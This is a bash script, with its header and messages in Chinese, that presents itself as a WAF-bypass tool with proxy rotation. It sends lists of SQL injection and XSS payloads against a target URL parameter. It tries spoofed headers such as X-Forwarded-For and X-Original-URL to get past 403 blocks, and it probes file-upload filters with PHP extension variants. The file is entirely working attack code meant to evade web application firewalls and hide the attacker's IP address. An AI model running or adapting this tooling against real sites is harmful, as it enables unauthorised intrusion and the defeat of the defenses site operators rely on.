#!/bin/bash
# WAF绕过脚本 - v10.7（集成代理轮换）

source /workspace/proxy_manager.sh 2>/dev/null || true

# 使用代理执行curl请求
curl_with_proxy() {
    local url=$1
    shift
    local proxy=$(get_working_proxy)
    
    if [ -n "$proxy" ]; then
        local formatted=$(format_proxy "$proxy")
        if echo "$formatted" | grep -q "|"; then
            local ip_port=$(echo "$formatted" | cut -d'|' -f1)
            local user=$(echo "$formatted" | cut -d'|' -f2)
            local pass=$(echo "$formatted" | cut -d'|' -f3)
            curl -sk --proxy "$ip_port" --proxy-user "$user:$pass" "$url" "$@"
        else
            curl -sk --proxy "$formatted" "$url" "$@"
        fi
    else
        curl -sk "$url" "$@"
    fi
}

# SQL注入绕过（15种payload + 代理轮换）
sqli_bypass() {
    local url=$1
    local param=$2
    
    local payloads=(
        "1'/**/OR/**/1=1--"
        "1'OR(1)=(1)--"
        "1'%09OR%091=1--"
        "1'UnIoN/**/SeLeCt/**/1,2,3--"
        "1'/*!50000UNION*//*!50000SELECT*/1,2,3--"
        "1'\u0027OR\u00201=1--"
        "1'||'1'='1"
        "1'OR'x'='x"
        "1'OR/**/true--"
        "1'%23%0aOR%231=1--"
        "1' OR 1=1#"
        "1' OR '1'='1"
        "1' AND 1=1--"
        "1' UNION SELECT NULL--"
        "1' OR 1=1 LIMIT 1--"
    )
    
    for payload in "${payloads[@]}"; do
        local test_url="${url}?${param}=${payload}"
        local response=$(curl_with_proxy "$test_url" 2>/dev/null)
        
        if echo "$response" | grep -qiE "error|syntax|mysql|postgresql|sql|database"; then
            echo "[✅ SQLi Bypass] $payload"
            echo "$response" | head -20
            return 0
        fi
    done
    
    echo "[❌ SQLi Bypass失败]"
    return 1
}

# XSS绕过（10种payload + 代理轮换）
xss_bypass() {
    local url=$1
    local param=$2
    
    local payloads=(
        "<ScRiPt>alert(1)</sCrIpT>"
        "<svg/onload=alert(1)>"
        "<img src=x onerror=alert(1)>"
        "<iframe src=javascript:alert(1)>"
        "<script>eval(atob('YWxlcnQoMSk='))</script>"
        "<script>\u0061lert(1)</script>"
        "<body onload=alert(1)>"
        "<details open ontoggle=alert(1)>"
        "<marquee onstart=alert(1)>"
        "<input onfocus=alert(1) autofocus>"
    )
    
    for payload in "${payloads[@]}"; do
        local test_url="${url}?${param}=${payload}"
        local response=$(curl_with_proxy "$test_url" 2>/dev/null)
        
        if echo "$response" | grep -qiv "blocked\|forbidden\|waf"; then
            echo "[✅ XSS Bypass] $payload"
            return 0
        fi
    done
    
    echo "[❌ XSS Bypass失败]"
    return 1
}

# 403绕过（14种HTTP头 + 代理轮换）
bypass_403() {
    local url=$1
    
    local headers=(
        "X-Forwarded-For: 127.0.0.1"
        "X-Real-IP: 127.0.0.1"
        "X-Originating-IP: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "Client-IP: 127.0.0.1"
        "True-Client-IP: 127.0.0.1"
        "X-Original-URL: /"
        "X-Rewrite-URL: /"
        "X-Override-URL: /"
        "X-Admin: true"
        "X-Role: admin"
        "X-Privilege: admin"
        "Referer: $url"
    )
    
    for header in "${headers[@]}"; do
        local header_name=$(echo "$header" | cut -d: -f1)
        local header_value=$(echo "$header" | cut -d: -f2- | sed 's/^ //')
        
        local response=$(curl_with_proxy "$url" -H "$header_name: $header_value" 2>/dev/null)
        local status=$(echo "$response" | head -1 | grep -oE "[0-9]{3}")
        
        if [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ]; then
            echo "[✅ 403 Bypass] $header_name"
            return 0
        fi
    done
    
    echo "[❌ 403 Bypass失败]"
    return 1
}

# 文件上传绕过（10种方法 + 代理轮换）
upload_bypass() {
    local url=$1
    
    echo "test" > /tmp/test_shell.php
    
    local methods=(
        "file=@/tmp/test_shell.php"
        "file=@/tmp/test_shell.php;type=image/jpeg"
        "file=@/tmp/test_shell.PhP"
        "file=@/tmp/test_shell.php."
        "file=@/tmp/test_shell.phtml"
    )
    
    for method in "${methods[@]}"; do
        local response=$(curl_with_proxy "$url" -F "$method" 2>/dev/null)
        
        if echo "$response" | grep -qiE "success|uploaded|file"; then
            echo "[✅ Upload Bypass] $method"
            return 0
        fi
    done
    
    echo "[❌ Upload Bypass失败]"
    return 1
}

# 导出函数
export -f curl_with_proxy
export -f sqli_bypass
export -f xss_bypass
export -f bypass_403
export -f upload_bypass
